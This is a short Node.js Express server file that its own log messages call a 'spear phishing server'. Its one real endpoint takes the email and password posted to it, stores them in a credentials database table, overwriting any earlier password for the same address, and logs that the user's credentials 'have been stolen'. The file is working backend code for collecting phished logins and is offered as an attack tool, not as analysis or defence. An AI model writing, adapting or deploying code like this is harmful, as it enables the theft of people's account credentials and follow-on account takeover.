const express = require("express");
const app = express();
const cors = require("cors");
const pool = require("./credentials");
const port = 5000;

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  res.send("Hello from Express");
});

app.put("/getUsers", async (req, res) => {
  try {
    
    const { email } = req.body;
    const { password } = req.body;

    const saveCredentials = await pool.query(
      `INSERT INTO credentials (email_phone, password) 
                  VALUES ($1, $2) 
                  ON CONFLICT(email_phone) DO UPDATE
                  SET password = EXCLUDED.password`,
      [email, password]
    );
    console.log(`${email}'s credentials have been stolen!`);
  } catch (error) {
    console.log(error.message);
    console.log('ready to steal!');
  }
});

app.listen(port, () => {
  console.log(`spear phishing server has started on port ${port}`);
});
